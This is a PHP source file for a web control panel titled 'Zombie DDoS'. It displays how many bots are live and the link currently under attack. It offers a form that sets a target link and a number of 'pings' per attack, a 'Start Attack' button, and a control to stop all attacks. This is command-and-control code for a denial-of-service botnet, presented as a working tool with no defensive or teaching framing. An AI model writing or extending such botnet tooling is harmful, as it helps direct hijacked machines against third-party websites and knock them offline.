<?php
    require_once 'functions.php';
    
    $liveBots = getLiveBots();
?>

<head>
    <title>Zombie DDoS</title>
    <style>
        body {
            font-family: Calibri;
            text-align: center;
            margin: 10;
            padding: 20px;
            display: block;
            place-content: center;
            place-items: center;
            justify-content: center;
            height: 90%;
            width: 90%;
        }

        * {
            margin: auto;
        }

        .void { 
            padding: 25px;
        }

        .lvoid {
            padding-left: 5px;
            padding-right: 5px; 
        }
    </style>
</head>

<body>
    <h1>Control Your Bots</h1>

    <?php echo '<span style="color:red; font-size: 50px">'.sizeof($liveBots).'</span>' . "bots are live" ?>

    <div class="void"></div>

    <table border="1">
        <tr>
            <td><?php echo "<span style='color:blue; font-size: 20px'> ".htmlspecialchars(getLinkValue())." </span> is under attack"; ?></td>
            <td><?php echo "<span style='color:brown; font-size: 20px'> ".htmlspecialchars(getIterValue())." </span> pings in a go"; ?></td>
            <td><?php echo getAttackValue() == '1' ? '<span style="color:green; font-size: 20px">ACTIVE</span>' : '<span style="color:red; font-size: 20px">NOT ACTIVE</span>'; ?></td>
        </tr>
    </table>

    <div class="void"></div>

    <form action="saveAttackData.php" method="post">
        <table>
            <th>Please fill following data</th>
            <tr>
                <td>Set link To attack</td>
                <td><input type="text" name="link"></td>
            </tr>
            <tr>
                <td>Iteration Per Attack</td>
                <td><input type="text" name="iter"></td>
            </tr>
            <tr></tr>
            <tr>
                <td></td>
                <td><input type="submit" value="Start Attack"></td>
            </tr>
        </table>
    </form>

    <div class="void"></div>

    <form action="stopAttack.php" method="post">
        <input type="submit" value="Stop All Attacks">
    </form>
</body>
